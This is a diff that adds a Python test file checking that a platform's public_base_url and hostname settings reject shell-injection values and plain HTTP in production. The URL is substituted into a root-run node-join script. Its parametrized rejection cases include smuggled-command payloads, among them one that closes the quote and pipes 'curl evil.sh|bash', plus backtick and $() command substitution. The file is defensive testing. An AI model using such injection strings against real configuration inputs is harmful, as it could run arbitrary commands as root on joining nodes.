@@ -1,0 +1,117 @@
+"""对外地址配置的形态与协议闸门(Settings 层)。
+
+public_base_url 会被逐字替换进 node-join.sh 的 `API_BASE="__API_BASE__"` —— 双引号赋值,
+以 root 执行,且经 ConfigMap(非 Secret)下发。它同时是装机脚本的下载源与注册令牌、
+join token 的传输端点。这两件事各对应一道闸门:形态(拦命令注入)与协议(拦 MITM)。
+"""
+
+import base64
+
+import pytest
+from pydantic import ValidationError
+
+from app.core.config import Settings
+
+_KEY = base64.urlsafe_b64encode(b"k" * 32).decode()
+
+
+def _settings(**overrides) -> Settings:
+    return Settings(
+        **{  # type: ignore[arg-type]
+            "_env_file": None,
+            "environment": "test",
+            "config_encryption_key": _KEY,
+            **overrides,
+        }
+    )
+
+
+def _prod_kwargs() -> dict:
+    """能过 prod 校验的最小配置(与 test_security_hardening 同源,各用例注入一个坏值)。"""
+    return {
+        "_env_file": None,
+        "environment": "prod",
+        "jwt_secret": "9f4a1c7e2b8d0f63a5e9c417b3d68f02a1c4e7958b0d326f7a9c1e4b58d2f603",
+        "sms_provider": "aliyun",
+        "k8s_backend": "real",
+        "payment_mock": False,
+        "database_url": "postgresql+asyncpg://svc:pw@pg.internal:5432/superdl?sslmode=require",
+        "cors_origins": ["https://console.superdl.cn"],
+        "admin_host": "admin.superdl.cn",
+        "admin_edge_token": "edge-token-for-tests",
+        "jupyter_domain_suffix": "app.superdl.cn",
+        "service_domain_suffix": "svc.superdl.cn",
+        "public_base_url": "https://api.superdl.cn",
+        "metrics_token": "mtoken",
+        "config_encryption_key": _KEY,
+    }
+
+
+class TestPublicBaseUrlShape:
+    """形态闸门与环境无关:dev 配歪了同样会把元字符带进装机脚本与用户可见连接串。"""
+
+    @pytest.mark.parametrize(
+        "bad",
+        [
+            # 闭合双引号后追加命令 —— node-join.sh 是 root 执行的
+            'https://api.superdl.cn";curl evil.sh|bash;#',
+            "https://api.superdl.cn`id`",  # 反引号命令替换
+            "https://api.superdl.cn$(id)",  # $() 命令替换
+            "https://api.superdl.cn\nAPI_BASE=http://evil",  # 换行后另起赋值行
+            "https://api.superdl.cn\\",  # 反斜杠续行,吃掉下一行
+            "https://api superdl.cn",  # 空白拆词
+            "ftp://api.superdl.cn",  # 非 http(s) 协议
+            "api.superdl.cn",  # 缺协议头
+            "https://api.superdl.cn/x;y",  # 路径里的分号
+        ],
+    )
+    def test_rejects_injectable_values(self, bad: str):
+        """挂了 = 任何能改这一项配置的人都能在每台加入的节点上以 root 执行任意命令。"""
+        with pytest.raises(ValidationError, match="public_base_url"):
+            _settings(public_base_url=bad)
+
+    @pytest.mark.parametrize(
+        "good",
+        [
+            "https://api.superdl.cn",
+            "https://api.superdl.example.com",
+            "http://localhost:8000",  # dev 形态:协议闸门只在 prod 生效
+            "https://api.superdl.cn:8443/base-path",
+        ],
+    )
+    def test_accepts_normal_values(self, good: str):
+        assert _settings(public_base_url=good).public_base_url == good
+
+    @pytest.mark.parametrize(
+        "name", ["jupyter_domain_suffix", "service_domain_suffix", "admin_host"]
+    )
+    def test_bare_hostname_settings_reject_metacharacters(self, name: str):
+        """这三项进用户可见的 ssh 连接串、HTTPRoute hostname 与 Host 比较,同口径拒元字符。
+        挂了 = 域名配置成了另一处可注入的入口。"""
+        with pytest.raises(ValidationError, match=name):
+            _settings(**{name: 'evil.cn";id;#'})
+
+
+class TestPublicBaseUrlScheme:
+    def test_prod_rejects_plain_http(self):
+        """prod 明文 http:路径上的人能改写以 root 执行的装机脚本,并读走 Bearer 注册令牌
+        与响应体里的 join token。挂了 = 整条节点接入链路可被中间人接管。"""
+        kwargs = {**_prod_kwargs(), "public_base_url": "http://api.superdl.cn"}
+        with pytest.raises(ValidationError, match="public_base_url"):
+            Settings(**kwargs)
+
+    def test_prod_accepts_https(self):
+        assert Settings(**_prod_kwargs()).public_base_url == "https://api.superdl.cn"
+
+
+class TestTenantPodCidr:
+    def test_rejects_non_cidr(self):
+        """网段配错会让 NetworkPolicy 被 apiserver 拒收(整个租户 ns 无策略下发),
+        或者 except 落空。挂了 = 配置错误要等到建租户 ns 时才炸。"""
+        with pytest.raises(ValidationError, match="tenant_pod_cidr"):
+            _settings(tenant_pod_cidr="10.42.0.0/33")
+
+    def test_default_matches_k3s_rke2(self):
+        """默认值须与 deploy/app/k8s 的 FORWARDED_ALLOW_IPS 同源;
+        挂了 = 默认部署下租户之间的 22 端口互连没被挡住。"""
+        assert _settings().tenant_pod_cidr == "10.42.0.0/16"
